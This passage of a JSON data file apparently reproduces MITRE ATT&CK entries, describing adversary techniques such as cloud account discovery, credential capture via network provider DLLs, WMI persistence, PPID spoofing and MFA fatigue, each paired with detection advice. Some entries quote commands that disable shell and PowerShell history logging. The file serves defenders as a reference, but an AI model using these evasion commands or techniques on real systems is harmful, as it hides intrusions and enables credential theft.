      "description": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1087.004",
      "stix_id": "attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe",
      "created": "2020-02-21T21:08:36.570000+00:00",
      "modified": "2025-04-15T22:00:56.981000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained."
    },
    "T1057": {
      "id": "T1057",
      "name": "Process Discovery",
      "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1057",
      "stix_id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
      "created": "2017-05-31T21:30:48.728000+00:00",
      "modified": "2025-04-15T19:58:50.607000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor for `show` commands being run by non-standard users from non-standard locations."
    },
    "T1562.003": {
      "id": "T1562.003",
      "name": "Impair Command History Logging",
      "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.003",
      "stix_id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
      "created": "2020-02-21T20:56:06.498000+00:00",
      "modified": "2025-04-15T19:58:50.696000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Sensor Health: Host Status",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code>, <code>HISTFILE</code>, or <code>HISTFILESIZE</code> environment variables may be suspicious.\n\nMonitor for modification of PowerShell command history settings through processes being created with <code>-HistorySaveStyle SaveNothing</code> command-line arguments and use of the PowerShell commands <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> and <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to clear or disable historical log data with built-in features native to the network device platform.  Monitor such command activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations."
    },
    "T1556.008": {
      "id": "T1556.008",
      "name": "Network Provider DLL",
      "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.008",
      "stix_id": "attack-pattern--90c4a591-d02d-490b-92aa-619d9701ac04",
      "created": "2023-03-30T22:45:00.431000+00:00",
      "modified": "2025-04-15T22:51:56.379000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Process: OS API Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1546.003": {
      "id": "T1546.003",
      "name": "Windows Management Instrumentation Event Subscription",
      "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.003",
      "stix_id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
      "created": "2020-01-24T14:07:56.276000+00:00",
      "modified": "2025-04-15T19:58:50.950000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Process: Process Creation",
        "Command: Command Execution",
        "WMI: WMI Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.(Citation: TechNet Autoruns)(Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).(Citation: Microsoft Register-WmiEvent)"
    },
    "T1596.004": {
      "id": "T1596.004",
      "name": "CDNs",
      "description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1596.004",
      "stix_id": "attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75",
      "created": "2020-10-02T16:59:56.648000+00:00",
      "modified": "2025-04-15T21:55:21.053000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1497.002": {
      "id": "T1497.002",
      "name": "User Activity Based Checks",
      "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1497.002",
      "stix_id": "attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938",
      "created": "2020-03-06T21:04:12.454000+00:00",
      "modified": "2025-04-15T19:58:51.123000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. "
    },
    "T1496.004": {
      "id": "T1496.004",
      "name": "Cloud Service Hijacking",
      "description": "Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability. \n\nFor example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking 2024)\n\nIn some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking 2024) Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability. ",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1496.004",
      "stix_id": "attack-pattern--924d273c-be0d-4d8d-af58-2dddb15ef1e2",
      "created": "2024-09-25T14:05:59.910000+00:00",
      "modified": "2025-04-15T22:03:40.356000+00:00",
      "platforms": [
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Modification",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1585.003": {
      "id": "T1585.003",
      "name": "Cloud Accounts",
      "description": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)\n\nCreating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1585.003",
      "stix_id": "attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5",
      "created": "2022-05-27T14:06:05.130000+00:00",
      "modified": "2025-04-15T22:01:31.837000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537))."
    },
    "T1072": {
      "id": "T1072",
      "name": "Software Deployment Tools",
      "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1072",
      "stix_id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
      "created": "2017-05-31T21:30:57.201000+00:00",
      "modified": "2025-04-15T19:58:51.465000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system."
    },
    "T1041": {
      "id": "T1041",
      "name": "Exfiltration Over C2 Channel",
      "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1041",
      "stix_id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
      "created": "2017-05-31T21:30:41.804000+00:00",
      "modified": "2025-04-15T19:58:51.597000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
    },
    "T1134.004": {
      "id": "T1134.004",
      "name": "Parent PID Spoofing",
      "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1134.004",
      "stix_id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
      "created": "2020-02-18T18:22:41.448000+00:00",
      "modified": "2025-04-16T20:37:18.203000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: OS API Execution",
        "Process: Process Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible."
    },
    "T1591": {
      "id": "T1591",
      "name": "Gather Victim Org Information",
      "description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1591",
      "stix_id": "attack-pattern--937e4772-8441-4e4a-8bf0-8d447d667e23",
      "created": "2020-10-02T16:27:02.339000+00:00",
      "modified": "2025-04-15T22:38:32.343000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1606": {
      "id": "T1606",
      "name": "Forge Web Credentials",
      "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1606",
      "stix_id": "attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c",
      "created": "2020-12-17T02:13:46.247000+00:00",
      "modified": "2025-04-15T22:37:02.111000+00:00",
      "platforms": [
        "SaaS",
        "Windows",
        "macOS",
        "Linux",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Web Credential: Web Credential Usage",
        "Web Credential: Web Credential Creation",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations."
    },
    "T1621": {
      "id": "T1621",
      "name": "Multi-Factor Authentication Request Generation",
      "description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \u201cMFA fatigue.\u201d(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1621",
      "stix_id": "attack-pattern--954a1639-f2d6-407d-aef3-4917622ca493",
      "created": "2022-04-01T02:15:49.754000+00:00",
      "modified": "2025-04-15T22:50:21.216000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Logon Session: Logon Session Metadata",
        "Application Log: Application Log Content",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
